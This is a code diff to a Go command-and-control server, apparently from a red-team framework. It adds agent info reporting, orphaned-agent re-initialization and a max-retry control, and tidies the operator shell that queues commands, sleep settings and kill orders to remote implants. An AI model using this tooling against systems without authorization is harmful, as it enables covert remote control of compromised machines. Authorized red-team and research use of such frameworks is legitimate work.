@@ -36,8 +36,8 @@ var src = rand.NewSource(time.Now().UnixNano())
 var currentDir, _ = os.Getwd()
 var agents = make(map[uuid.UUID]*agent) //global map to house agent objects
 var paddingMax = 4096
-var version string
-var build string
+var version = "nonRelease"
+var build = "nonRelease"
 
 //Constants
 const (
@@ -67,7 +67,7 @@ func main() {
 
 func httpHandler(w http.ResponseWriter, r *http.Request) {
 	if VERBOSE {
-		color.Yellow("[-]Recieved HTTP %s Connection from %s", r.Method, r.Host)
+		color.Yellow("[-]Received HTTP %s Connection from %s", r.Method, r.Host)
 	}
 
 	if DEBUG {
@@ -129,6 +129,11 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 				color.Red("%s", p.Stderr)
 			}
 
+		case "AgentInfo":
+			var p messages.AgentInfo
+			json.Unmarshal(payload, &p)
+			agentInfo(j, p)
+
 		default:
 			color.Red("[!]Invalid Activity: %s", j.Type)
 		}
@@ -149,17 +154,17 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 
 	time.Sleep(45 * time.Millisecond) //Sleep to allow the shell to start up
 	//Check to make sure files exist
-	_, err_crt := os.Stat(crt)
-	if err_crt != nil {
+	_, errCrt := os.Stat(crt)
+	if errCrt != nil {
 		color.Red("[!]There was an error importing the SSL/TLS x509 certificate")
-		fmt.Println(err_crt)
+		fmt.Println(errCrt)
 		return
 	}
 
-	_, err_key := os.Stat(key)
-	if err_key != nil {
+	_, errKey := os.Stat(key)
+	if errKey != nil {
 		color.Red("[!]There was an error importing the SSL/TLS x509 key")
-		fmt.Println(err_key)
+		fmt.Println(errKey)
 		return
 	}
 
@@ -207,7 +212,7 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 }
 
 func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
-	color.Green("[+]Recieved new agent checkin from %s", j.ID)
+	color.Green("[+]Received new agent checkin from %s", j.ID)
 	if VERBOSE {
 		color.Yellow("\t[i]Host ID: %s", j.ID)
 		color.Yellow("\t[i]Activity: %s", j.Type)
@@ -218,7 +223,7 @@ func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
 	}
 	agentsDir := filepath.Join(currentDir, "data", "agents")
 
-	if _, d_err := os.Stat(agentsDir); os.IsNotExist(d_err) {
+	if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
 		os.Mkdir(agentsDir, os.ModeDir)
 	}
 	if _, err := os.Stat(filepath.Join(agentsDir, j.ID.String())); os.IsNotExist(err) {
@@ -251,13 +256,64 @@ func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
 	//Add code here to create db record
 }
 
+func agentInfo(j messages.Base, p messages.AgentInfo) {
+	_, ok := agents[j.ID]
+
+	if ! ok {color.Red("[!]The agent was not found while processing an AgentInfo message"); return}
+	if DEBUG {
+		color.Red("[DEBUG]Processing new agent info")
+		color.Red("\t[DEBUG]Agent Version: %s", p.Version)
+		color.Red("\t[DEBUG]Agent Build: %s", p.Build)
+		color.Red("\t[DEBUG]Agent waitTime: %s", p.WaitTime)
+		color.Red("\t[DEBUG]Agent paddingMax: %d", p.PaddingMax)
+		color.Red("\t[DEBUG]Agent maxRetry: %d", p.MaxRetry)
+		color.Red("\t[DEBUG]Agent failedCheckin: %d", p.FailedCheckin)
+	}
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Processing AgentInfo message:\r\n",time.Now()))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Version: %s \r\n", p.Version))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Build: %s \r\n", p.Build))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent waitTime: %s \r\n", p.WaitTime))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent paddingMax: %d \r\n", p.PaddingMax))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent maxRetry: %d \r\n", p.MaxRetry))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent failedCheckin: %d \r\n", p.FailedCheckin))
+
+	agents[j.ID].version = p.Version
+	agents[j.ID].build = p.Build
+	agents[j.ID].waitTime = p.WaitTime
+	agents[j.ID].paddingMax = p.PaddingMax
+	agents[j.ID].maxRetry = p.MaxRetry
+	agents[j.ID].failedCheckin = p.FailedCheckin
+}
+
 func statusCheckIn(j messages.Base) messages.Base {
-	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent status check in",time.Now()))
+	// Check to make sure agent UUID is in dataset
+	_, ok := agents[j.ID]
+	if ! ok {
+		color.Red("[!]Orphaned agent %s has checked in. Instructing agent to re-initialize...", j.ID.String())
+		jobID := RandStringBytesMaskImprSrc(10)
+		color.Yellow("[-]Created job %s for agent %s", jobID, j.ID)
+		g := messages.Base{
+			Version: 1.0,
+			ID:      j.ID,
+			Type:    "AgentControl",
+			Padding: RandStringBytesMaskImprSrc(paddingMax),
+		}
+		p := messages.AgentControl{
+			Command: "initialize",
+			Job: jobID,
+		}
+
+		k := marshalMessage(p)
+		g.Payload = (*json.RawMessage)(&k)
+		return g
+	}
+
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent status check in\r\n",time.Now()))
 	if VERBOSE {
-		color.Green("[+]Recieved agent status checkin from %s", j.ID)
+		color.Green("[+]Received agent status checkin from %s", j.ID)
 	}
 	if DEBUG{
-		color.Red("[DEBUG]Recieved agent status checkin from %s", j.ID)
+		color.Red("[DEBUG]Received agent status checkin from %s", j.ID)
 		color.Red("[DEBUG]Channel length: %d", len(agents[j.ID].channel))
 		color.Red("[DEBUG]Channel content: %s", agents[j.ID].channel)
 	}
@@ -399,6 +455,7 @@ func shell() {
 					readline.PcItem("sleep"),
 						readline.PcItem("kill"),
 							readline.PcItem("padding"),
+								readline.PcItem("maxretry"),
 				),
 			),
 			readline.PcItem("kill",
@@ -421,7 +478,9 @@ func shell() {
 	})
 
 	if err != nil {
-		panic(err)
+		//panic(err)
+		color.Red("[!]There was an error with the provided input")
+		color.Red(err.Error())
 	}
 	defer ms.Close()
 
@@ -444,94 +503,117 @@ func shell() {
 
 		switch cmd[0]{
 		case "agent":
-			switch cmd[1] {
-			case "list":
-				table := tablewriter.NewWriter(os.Stdout)
-				table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport"})
-				table.SetAlignment(tablewriter.ALIGN_CENTER)
-				for k, v := range agents {
-    					table.Append([]string{k.String(), v.platform + "/" + v.architecture, v.userName,
-								v.hostName, "HTTP/2"})
-				}
-				fmt.Println()
-				table.Render()
-				fmt.Println()
-			case "info":
-				if len(cmd) == 2 {
-				color.Red("[!]Invalid command")
-				color.White("agent info <agent_id>")
-				} else if len(cmd) >= 3 {
-					a, _ := uuid.FromString(cmd[2])
+			if len(cmd) >1 {
+				switch cmd[1] {
+				case "list":
 					table := tablewriter.NewWriter(os.Stdout)
-					table.SetAlignment(tablewriter.ALIGN_LEFT)
-					data := [][]string{
-						{"ID", agents[a].id.String()},
-						{"Platform", agents[a].platform},
-						{"Architecture", agents[a].architecture},
-						{"UserName", agents[a].userName},
-						{"User GUID", agents[a].userGUID},
-						{"Hostname", agents[a].hostName},
-						{"Process ID", strconv.Itoa(agents[a].pid)},
-						{"Inital Check In", agents[a].iCheckIn.String()},
-						{"Last Check In", agents[a].sCheckIn.String()},
+					table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport"})
+					table.SetAlignment(tablewriter.ALIGN_CENTER)
+					for k, v := range agents {
+						table.Append([]string{k.String(), v.platform + "/" + v.architecture, v.userName,
+							v.hostName, "HTTP/2"})
 					}
-					table.AppendBulk(data)
 					fmt.Println()
 					table.Render()
 					fmt.Println()
-				}
-			case "cmd":
-				if len(cmd) >= 4 {
-					addChannel(cmd)
-					a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[3]))
-					if DEBUG {
-						color.Red("[DEBUG]Input: %s", cmd[3])
-						color.Red("[DEBUG]Base64 Input: %s", a_cmd)
+				case "info":
+					if len(cmd) == 2 {
+						color.Red("[!]Invalid command")
+						color.White("agent info <agent_id>")
+					} else if len(cmd) >= 3 {
+						a, _ := uuid.FromString(cmd[2])
+						table := tablewriter.NewWriter(os.Stdout)
+						table.SetAlignment(tablewriter.ALIGN_LEFT)
+						data := [][]string{
+							{"ID", agents[a].id.String()},
+							{"Platform", agents[a].platform},
+							{"Architecture", agents[a].architecture},
+							{"UserName", agents[a].userName},
+							{"User GUID", agents[a].userGUID},
+							{"Hostname", agents[a].hostName},
+							{"Process ID", strconv.Itoa(agents[a].pid)},
+							{"Initial Check In", agents[a].iCheckIn.String()},
+							{"Last Check In", agents[a].sCheckIn.String()},
+							{"Agent Version", agents[a].version},
+							{"Agent Build", agents[a].build},
+							{"Agent Wait Time", agents[a].waitTime},
+							{"Agent Message Padding Max", strconv.Itoa(agents[a].paddingMax)},
+							{"Agent Max Retries", strconv.Itoa(agents[a].maxRetry)},
+							{"Agent Failed Logins", strconv.Itoa(agents[a].failedCheckin)},
+						}
+						table.AppendBulk(data)
+						fmt.Println()
+						table.Render()
+						fmt.Println()
 					}
-				} else {
-					color.Red("[!]Invalid command")
-					color.White("agent cmd <agent ID> <cmd>")
-				}
-			case "kill":
-				if len(cmd) == 3 {
-					addChannel(cmd)
-				} else {
-					color.Red("[!]Invalid command")
-					color.White("agent kill <agent ID>")
-				}
-			case "control":
-				switch cmd[3] {
+				case "cmd":
+					if len(cmd) >= 4 {
+						addChannel(cmd)
+						cmdAgent := base64.StdEncoding.EncodeToString([]byte(cmd[3]))
+						if DEBUG {
+							color.Red("[DEBUG]Input: %s", cmd[3])
+							color.Red("[DEBUG]Base64 Input: %s", cmdAgent)
+						}
+					} else {
+						color.Red("[!]Invalid command")
+						color.White("agent cmd <agent ID> <cmd>")
+					}
 				case "kill":
-					addChannel(cmd)
-				case "sleep":
-					if len(cmd) == 5 {
-						_, err := time.ParseDuration(cmd[4])
-						if err != nil {
-							color.Red("[!]There was an error setting the agent sleep time")
-							color.Red(err.Error())
-						} else {
-							addChannel(cmd)
-						}
+					if len(cmd) == 3 {
+						addChannel(cmd)
 					} else {
 						color.Red("[!]Invalid command")
-						color.White("agent control <agent ID> sleep <time>")
+						color.White("agent kill <agent ID>")
 					}
-				case "padding":
-					if len(cmd) == 5 {
-						_, err := strconv.Atoi(cmd[4])
-						if err != nil {
-							color.Red("[!]There was an error setting the agent maximum message padding size")
-							color.Red(err.Error())
+				case "control":
+					switch cmd[3] {
+					case "kill":
+						addChannel(cmd)
+					case "sleep":
+						if len(cmd) == 5 {
+							_, err := time.ParseDuration(cmd[4])
+							if err != nil {
+								color.Red("[!]There was an error setting the agent sleep time")
+								color.Red(err.Error())
+							} else {
+								addChannel(cmd)
+							}
 						} else {
-							addChannel(cmd)
+							color.Red("[!]Invalid command")
+							color.White("agent control <agent ID> sleep <time>")
 						}
-					} else {
-						color.Red("[!]Invalid command")
-						color.White("agent control <agent ID> padding <size as integer>")
+					case "padding":
+						if len(cmd) == 5 {
+							_, err := strconv.Atoi(cmd[4])
+							if err != nil {
+								color.Red("[!]There was an error setting the agent maximum message padding size")
+								color.Red(err.Error())
+							} else {
+								addChannel(cmd)
+							}
+						} else {
+							color.Red("[!]Invalid command")
+							color.White("agent control <agent ID> padding <size as integer>")
+						}
+					case "maxretry":
+						if len(cmd) == 5 {
+							_, err := strconv.Atoi(cmd[4])
+							if err != nil {
+								color.Red("[!]There was an error setting the agent maximum retries")
+								color.Red(err.Error())
+							} else {
+								addChannel(cmd)
+							}
+						} else {
+							color.Red("[!]Invalid command")
+							color.White("agent control <agent ID> maxretry <tries as integer>")
+						}
 					}
+				default:
+					color.Yellow("[-]Invalid agent command:", line[5:])
 				}
-			default:
-				println("invalid agent command:", line[5:])
+			} else {
+				color.Yellow("[-]Missing subsequent agent command")
 			}
 		case "help":
 			usage()
@@ -545,7 +627,7 @@ func shell() {
 			os.Exit(0)
 		case "":
 		default:
-			log.Println("you said:", strconv.Quote(line))
+			color.Yellow("[-]Invalid command")
 		}
 	}
 }
@@ -600,4 +682,13 @@ type agent struct {
 	channel		chan []string
 	iCheckIn	time.Time
 	sCheckIn	time.Time
+	version 	string
+	build 		string
+	waitTime 	string
+	paddingMax 	int
+	maxRetry	int
+	failedCheckin 	int
 }
+
+//TODO Add session ID
+//TODO add job and its ID to the channel immediately after input
